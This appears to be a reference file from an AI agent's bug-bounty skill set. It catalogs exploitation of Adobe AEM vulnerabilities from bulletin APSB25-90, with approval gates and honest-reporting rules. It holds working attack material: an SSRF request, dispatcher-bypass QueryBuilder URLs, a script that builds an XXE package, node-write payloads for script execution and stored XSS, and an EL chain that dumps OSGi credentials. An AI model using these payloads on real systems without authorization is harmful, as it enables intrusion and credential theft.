# APSB25-90 — AEM Sites / Cloud Service endpoint catalog

## Contents

- [Read this first — the family is NOT pre-auth](#read-this-first--the-family-is-not-pre-auth)
- [The verified CVE table](#the-verified-cve-table)
- [Production rung map — only two entries are rung 1](#production-rung-map--only-two-entries-are-rung-1)
- [E1 — /services/accesstoken/verify SSRF](#e1--servicesaccesstokenverify--ssrf)
- [E2 — QueryBuilder JSON exposure](#e2--binquerybuilderjson--content-exposure)
- [E3 — /crx/packmgr/service/exec.json blind XXE](#e3--crxpackmgrserviceexecjson--blind-xxe-on-package-import)
- [E4 — cloudsettings node-write, the shared primitive](#e4--the-cloudsettings-node-write--one-primitive-three-cves)
- [E5 — GraphQL / Content Fragment Models](#e5--graphql--content-fragment-models-no-cve)

## Read this first — the family is NOT pre-auth

**Every CVE in this bulletin is scored `PR:L` by NVD — a low-privilege account —
except CVE-2025-54250, which is `PR:H`.** Earlier write-ups of this material, this
skill's own predecessor included, labelled the section a "pre-auth endpoint catalog".
That is wrong and it costs two ways:

- **An anonymous `401`/`403` does not mean patched.** It means you have no account.
  Get a low-privilege author/contributor login from
  `targets/<program>/accounts.md` — if it is not there, ask d0x once for the exact required role — and re-fire
  every probe before you write "not vulnerable" in `notes/`.
- **Do not claim "unauthenticated" in a report.** A triager checks the NVD vector,
  finds `PR:L`, and reads the entire report as unverified. The genuinely
  unauthenticated AEM bugs are a different product and a different bulletin —
  `forms-on-jee.md`.

**Affected:** AEM ≤ **6.5.23.0**, AEM Cloud Service ≤ **2025.8.0**. Fixed
**2025-09-09**. Self-hosted estates lag that by months, which is where this catalog
still pays. Cloud Service instances on a current release are patched — but the
dispatcher **forms** in `fingerprint-and-sling.md` are unaffected by the patch,
because Adobe does not classify a dispatcher-filter bypass as a vulnerability
(`../SKILL.md` reconciles the two positions).

**A version match is rung 0.** Each entry below names the oracle that must fire
against that specific endpoint. Nothing else is reportable.
(`../../_shared/references/safe-ladder.md` §"Claiming a CVE".)

## The verified CVE table

Checked against NVD, Adobe APSB25-90 and the slcyber.io research write-up on
2026-07-26. **Neither Adobe nor the researchers published an endpoint-to-id
mapping**, and NVD's descriptions for this family are generic ("Security feature
bypass"). Only the three pinned by a distinctive CWE can be matched to an endpoint;
the rest are inferred from the CWE and the CVSS vector and are labelled so. Carry
that label into any report — an inferred id is a guess about which number the vendor
assigned, not a guess about whether the technique works.

| CVE | CWE / CVSS 3.1 (NVD) | Endpoint | Confidence |
|---|---|---|---|
| CVE-2025-54246 | CWE-863 Incorrect Authorization, 6.5, `PR:L` | QueryBuilder JSON exposure (E2) | **INFERRED** |
| CVE-2025-54247 | CWE-20 Improper Input Validation, 6.5, `PR:L`, `C:H` | EL injection → OSGi credential dump (E4c) | **INFERRED** |
| CVE-2025-54248 | CWE-20 Improper Input Validation, 7.7, `PR:L`, `S:C` | EL injection → OSGi credential dump (E4c) | **INFERRED** |
| CVE-2025-54249 | CWE-918 SSRF, 6.5, `PR:L` | `/services/accesstoken/verify` (E1) | **CONFIRMED BY CLASS** |
| CVE-2025-54250 | CWE-20, 4.9, `PR:H` | `cloudsettings` node-write → script exec (E4a) | **INFERRED** |
| CVE-2025-54251 | CWE-91 XML Injection, 4.3, `PR:L` | `/crx/packmgr/service/exec.json` blind XXE (E3) | **CONFIRMED BY CLASS** |
| CVE-2025-54252 | CWE-79 stored XSS, 5.4, `PR:L`, `UI:R` | `experienceinfo.json.html` (E4b) | **CONFIRMED BY CLASS** |

"CONFIRMED BY CLASS" means the CWE uniquely identifies which technique the id
belongs to (only one SSRF, one XML-injection, one XSS in the bulletin). It is not a
vendor statement that this endpoint is that id. If a report needs the id to be
certain, cite the technique and the bulletin (APSB25-90) and leave the id out.

**Never add an id to this table from memory.** If you want to cite one that is not
here, confirm it against NVD or the Adobe advisory first and record the source.

## Production rung map — only two entries are rung 1

Four of the five entries below reach their impact by **writing request parameters
into a node under `/conf/global/settings/dam/import`** — a shared configuration path
on a live content repository. The source material this catalog was ported from
ranked that node-write as the highest-priority move with no gate at all. That is
wrong under `../../_shared/references/safe-ladder.md`:

| Entry | Action | Rung on production |
|---|---|---|
| E1 SSRF | POST a URL you own, read the reflected response | **1** — read-only, your own listener |
| E2 QueryBuilder | GET, bounded `p.limit` | **1** — read-only |
| E3 packmgr XXE | uploads and installs a package | **5** — not attempted: ask d0x directly before executing |
| E4a node-write → script exec | writes a shared config node | **5** — not attempted: ask d0x directly before executing |
| E4b stored XSS | writes a shared config node | **5** — not attempted: ask d0x directly before executing |
| E4c EL → credential dump | writes a shared config node | **5** — not attempted: ask d0x directly before executing |

So the honest production order is **E1 → E2 → (stop: d0x's approval before execution) → E3/E4**. Bring
the exact request and the impact it proves in the verdict. E4 is where the Criticals
are, and it stays gated anyway: a self-hosted lab instance or an explicitly
authorized `*-uat`/`*-oat` host is the right place to run it (safe ladder rung 4),
and demonstrating it there and inferring prod is a complete, payable proof.

## E1 — `/services/accesstoken/verify` — SSRF

**CVE-2025-54249 · CWE-918 · 6.5 `PR:L` · CONFIRMED BY CLASS · rung 1**

`doPost` takes a URL, fetches it server-side, and returns the response body **in
full** — a read SSRF, not blind. Usually reachable under default dispatcher rules;
only prepend a bypass form if it is blocked.

```http
POST /services/accesstoken/verify HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

auth_url=http://<your-oob-id>.<oast-domain>/probe
```

```bash
interactsh-client -v            # in another shell
curl -s -x 127.0.0.1:8080 -X POST "$H/services/accesstoken/verify" \
     -d 'auth_url=http://<your-oob-id>.<oast-domain>/probe' -i | head -30
```

**Oracle:** an HTTP hit on your listener from the target's egress IP with a
`Java/<ver>` User-Agent, **and** the fetched body reflected in the response. Either
alone is weaker; both together prove a full-read SSRF at rung 1 with nothing but your
own infrastructure touched.

**Then hand it to `../../ssrf-safe`** — it owns the host-filter bypass ladder, the
IMDS/metadata reach (`169.254.169.254`, `metadata.google.internal`, the IMDSv2 token
problem, `169.254.170.2` ECS) and the caller-token exfil lift. Do not re-derive any
of that here; the AEM-specific part is the endpoint and the `auth_url` parameter name.

**Converts?** Yes, Critical when it reaches instance credentials or an internal admin
service; High for a proven internal-network read; Medium for OOB-only with no
reflected body. The report belongs to `ssrf-safe`.

## E2 — `/bin/querybuilder.json` — content exposure

**CVE-2025-54246 · CWE-863 · 6.5 `PR:L` · INFERRED · rung 1**

```bash
curl -s "$H/bin/querybuilder.json?path=/etc&p.limit=10" | jq '.'
curl -s "$H/bin/querybuilder.json?path=/home/users&p.limit=10&p.hits=full" | jq '.hits[0]'
```

Blocked at the edge? Use a bypass form from `fingerprint-and-sling.md`:

```bash
curl -s "$H/bin/querybuilder.json;x=a/b.css/c?path=/etc&p.limit=10"
curl -s "$H/graphql/execute.json/..%2f../bin/querybuilder.json?path=/etc&p.limit=10"
```

**Oracle:**

```json
{"success":true,"results":10,"total":184,"more":true,"offset":0,"hits":[…]}
```

That exact envelope with `success:true` is the canonical signature. A dispatcher 403
body, a Granite error page, or `{"success":false}` is not a bypass.

**Bound it.** `p.limit=10` for the proof. The `total` field states the scale for you —
report the number, do not download it (`../../_shared/references/safe-ladder.md` rung 3). `p.limit=-1` on a
production repository is the destructive version of the same proof and adds nothing.

**Converts?** High when `hits` carry non-public content — user or group nodes, config
under `/conf` or `/etc`, unpublished pages, anything property-named
`(pwd|password|secret|token|key|credential)`. Medium for structure and metadata only.
**No** if the hits are the site's own published content — that is the
`.infinity.json` false-positive gate in `../SKILL.md` wearing a different hat. A
property carrying live credentials leaves immediately for `../../exposed-secrets`.

## E3 — `/crx/packmgr/service/exec.json` — blind XXE on package import

**CVE-2025-54251 · CWE-91 · 4.3 `PR:L` · CONFIRMED BY CLASS · rung 5 on production**

`PrivilegeXmlHandler` parses `META-INF/vault/privileges.xml` from an imported package
without disabling entity expansion. Building the package is free; **installing it
writes to the repository**, so on production this requires d0x's approval before execution, not attempted.

Build the probe package — verified locally, this is the real output:

```bash
python3 - <<'PY'
import zipfile
OOB = "xxe-probe.oast.example"          # your interactsh host
priv = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE privileges [<!ENTITY x SYSTEM "http://{OOB}/p">]>
<privileges><privilege name="&x;" isAbstract="false"/></privileges>
'''
filt = '<?xml version="1.0" encoding="UTF-8"?>\n<workspaceFilter version="1.0"><filter root="/tmp/probe"/></workspaceFilter>\n'
props = ('<?xml version="1.0" encoding="UTF-8"?>\n'
 '<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">\n'
 '<properties><entry key="name">probe</entry><entry key="group">tmp</entry>'
 '<entry key="version">1.0</entry></properties>\n')
with zipfile.ZipFile("probe.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("META-INF/vault/privileges.xml", priv)
    z.writestr("META-INF/vault/filter.xml", filt)
    z.writestr("META-INF/vault/properties.xml", props)
    z.writestr("jcr_root/tmp/probe/.content.xml",
               '<?xml version="1.0" encoding="UTF-8"?>\n<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" jcr:primaryType="nt:unstructured"/>\n')
PY
```

```
$ unzip -l probe.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      184  2026-07-26 14:35   META-INF/vault/privileges.xml
      116  2026-07-26 14:35   META-INF/vault/filter.xml
      228  2026-07-26 14:35   META-INF/vault/properties.xml
      124  2026-07-26 14:35   jcr_root/tmp/probe/.content.xml
```

The `filter.xml` root is deliberately `/tmp/probe` — a scratch path that exists on no
real site — so installation applies nothing to live content. That is the smallest
footprint this technique has; it is still a write.

Do not fire it: ask d0x directly with the exact invocation before executing (verified syntactically against a local
listener; the response shape is what a real instance returns):

```bash
curl -s -x 127.0.0.1:8080 -F "cmd=install" -F "force=true" \
     -F "package=@probe.zip;type=application/zip" \
     "$H/crx/packmgr/service/exec.json?cmd=install"
```

**Oracle:** a DNS or HTTP hit on your listener from the target, User-Agent
`Java/<ver>`, arriving while the install request is in flight. The JSON response
itself will usually report success or a benign privilege error either way — **the
callback is the finding, the response body is not**.

**Blind only.** Modern Java URL handling will not carry multi-line file content back
through an external entity, so this is an OOB confirm and an internal-reach primitive,
not an arbitrary file read. Do not describe it as one. `../../ssrf-safe` owns the
XXE→SSRF entity forms and the internal-reach escalation
(`../../ssrf-safe/references/cve-tooling.md` there).

**Revert:** delete the uploaded package (`/crx/packmgr/service/.json/etc/packages/tmp/probe-1.0.zip?cmd=delete`)
and say in the report that you did. Nothing else was created.

**Converts?** Medium. It is a real boundary crossing on a `4.3` CWE-91 with a blind
oracle — file it honestly at Medium and let the internal reach, if you prove one,
carry it to High. Inflating a blind XXE to Critical is how this one gets closed.

## E4 — the `cloudsettings` node-write — one primitive, four CVEs

**rung 5 on production for all three variants — not attempted: ask d0x directly before executing.**

`BulkImportConfigServlet` switches to the `createrendition` service account and writes
**every request parameter verbatim** as node properties under
`/conf/global/settings/dam/import` — no validation, no ACL check. `ConfDeliveryServlet`
then resolves that node with the `contexthub-conf-reader` account and **dispatches it
as a script**, because its glob permissions match `*/cloudsettings` and
`*/cloudsettings/*`. Whatever `sling:resourceType` you wrote is what executes.

Write (step 1, identical for all three variants — only the parameters differ):

```http
POST /cloudsettings.bulkimportConfig.json HTTP/1.1
Content-Type: application/x-www-form-urlencoded

importSource=UrlBased&sling:resourceType=<target>&<payload-params>
```

Trigger (step 2, identical for all three):

```http
GET /etc/cloudsettings.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content HTTP/1.1
```

**This writes to a shared configuration path used by DAM bulk import.** On production
that is rung 5 under every reading of the non-destructive rules: it can disturb a
real asset-import configuration other people depend on. Not attempted — ask d0x directly before executing, keeping the payload
inert, and revert the node afterwards. Prefer a self-hosted lab or an authorized
`*-uat`/`*-oat` instance (rung 4) — proving it there and inferring prod is complete.

### E4a — node-write → script execution

**CVE-2025-54250 · CWE-20 · 4.9 `PR:H` · INFERRED**

```
importSource=UrlBased&sling:resourceType=/libs/cq/Dialog/html.jsp
```

**Oracle:** the chosen script renders in the step-2 response instead of the expected
config JSON. **`PR:H`** — this variant wants a high-privilege author account, so on a
program without one it is usually not reachable at all. Say that rather than
reporting the version.

**Converts?** Critical *if* you demonstrate execution — but the combination of `PR:H`,
a shared-path write and rung 5 means most engagements should demonstrate it on a lab
instance and report by inference. **Do not** claim it from the version alone.

### E4b — stored XSS via the same write

**CVE-2025-54252 · CWE-79 · 5.4 `PR:L` `UI:R` · CONFIRMED BY CLASS**

```
importSource=UrlBased&sling:resourceType=/libs/wcm/foundation/components/page/experienceinfo.json.html&jcr:title=<svg onload=alert(1)>
```

`experienceinfo.json.html` escapes `jcr:title` with `@context='scriptString'` but
serves the result as `text/html`, so the markup executes in whoever loads the step-2
URL — an author or admin session.

**Oracle:** your markup executes in the rendered step-2 response. Use a tagged
out-of-band payload, not `alert(1)`, so the callback proves *who* rendered it —
`../../xss` owns the callback channel, the payload set and the staff-session
escalation.

**Converts?** Medium on its own; High once `xss` shows a privileged viewer fired
it. `UI:R` is in the vector for a reason — a self-only render is not a finding.

### E4c — EL injection → OSGi configuration and credential dump

**CVE-2025-54247 (6.5 `C:H`) / CVE-2025-54248 (7.7 `S:C`) · CWE-20 · INFERRED**

The same write pointed at a JSP that evaluates an EL attribute:

```
importSource=UrlBased&sling:resourceType=/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp&action=${7*7}
```

**Oracle:** `49` in the step-2 rendered output where `${7*7}` was written. That is
the whole rung-1 confirmation — an arithmetic expression, no data touched. Confirm
it, then decide whether to climb.

The EL context is restricted to **property reads and array indexing** (no method
calls), which is still enough to walk the OSGi service registry:

```
#{pageContext.class.classLoader.bundle.bundleContext.bundles[0].registeredServices[0].properties}
```

Iterating `bundles[i].registeredServices[j].properties` dumps every registered
service's properties, which on a real estate hold cloud keys, integration
credentials, admin password hashes and signing certificates. Out-of-range indices
render blank, so many templates can be packed into one request.

**This is the highest-value entry in the bulletin and the most dangerous to run.**
Two separate gates apply: the write is rung 5, and a wholesale registry dump is a
bulk secret read. Confirm at `${7*7}`→`49`, then **ask d0x directly before executing** rather than dumping —
and when you do dump, pull a bounded slice that proves the class rather than the
whole registry.

`../../rce-hunting` (`../../rce-hunting/references/template-expression.md`) owns EL/OGNL confirmation
and escalation; `../../exposed-secrets` owns what a recovered credential is worth,
and there the deliverable is calling that credential's API read-only.

**Converts?** Critical when a live credential comes out and is exercised read-only.
The `${7*7}`→`49` confirmation alone is a solid High — it proves attacker-controlled
expression evaluation on the CMS — and it is the honest ceiling for a proof that
stayed at rung 1.

## E5 — GraphQL / Content Fragment Models (no CVE)

Headless AEM exposes persisted GraphQL queries. Not part of APSB25-90; included
because the same estate usually ships it.

```bash
curl -s "$H/content/graphql/global/endpoint.json" \
     -H 'Content-Type: application/json' \
     -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types|length'
```

**Oracle:** a populated `__schema` on a **publish** instance. Then read one Content
Fragment list operation and check whether it returns anything the site does not
publish.

**Converts?** Medium at best, and only with a field returning non-public data.
Introspection enabled on its own is a hardening note, not a bounty. `/graphql/execute.json`
is more valuable as the `nocanon` traversal vehicle in `fingerprint-and-sling.md`
than as a query surface.

## Evidence to capture before writing the lead

- The **fingerprint and version** (rung 0 — context, never the claim).
- **Which account fired it** — anonymous, or the low-priv role from
  `accounts.md`. State it explicitly; `PR:L` in the vector will be checked.
- The **exact request**, including any bypass form, and the **exact oracle line**
  from the response — the `success:true` envelope, the `49`, the `Java/<ver>` hit on
  your listener, the reflected internal body.
- The **negative control**: the same request without the bypass form, or without the
  session, returning the dispatcher 403 / `401`.
- The **CVE label as you are entitled to state it** — CONFIRMED BY CLASS or INFERRED,
  or the technique with no id at all.
- For any rung-5 entry: that it was **not attempted**, and the exact request carried
  in a direct approval request to d0x.

Then write the lead per `../../_shared/references/output-contract.md`. **File it under
the surface of the class it actually is** — `ssrf`, `secrets`, `rce`, `auth`, `idor` —
and put `aem` in the claim string, not in the surface. The dedup key is
`primitive|host|claim`, so a lead filed under a product surface will not dedup against
the same bug filed by `ssrf-safe` or `exposed-secrets` for the same host, and you
will pay for it with a duplicate report. Keep the claim string stable across sessions.
